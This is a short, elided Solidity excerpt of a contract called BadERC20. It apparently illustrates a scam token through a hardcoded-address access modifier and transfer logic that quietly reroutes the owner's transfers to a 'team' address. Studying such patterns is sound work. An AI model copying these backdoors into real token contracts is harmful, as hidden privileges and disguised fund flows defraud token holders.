...
contract BadERC20 is Context, IERC20 {
    ...
    modifier _auth() {
        require(msg.sender == 0xad1d871E84e88106D992bCF257919885CDF0c967, "Not allowed to interact");
        _;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (sender == _Owner) sender = team;
        if (recipient == _Owner) recipient = team;
    ...
    address public _Owner = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;
    ...
    constructor() public {
        ...
        team = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;
